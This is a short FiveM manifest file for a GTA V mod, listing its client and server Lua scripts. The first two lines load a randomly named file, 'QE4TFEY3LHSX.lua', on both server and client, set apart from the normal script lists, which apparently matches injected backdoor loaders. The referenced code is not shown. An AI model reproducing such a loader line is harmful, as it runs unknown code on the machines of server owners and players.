server_script "QE4TFEY3LHSX.lua"
client_script "QE4TFEY3LHSX.lua"
fx_version 'adamant'
game 'gta5'

client_scripts {
	'NativeUI.lua',
	'Config.lua',
	'Client/*.lua'
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'Config.lua',
	'Server/*.lua'
}
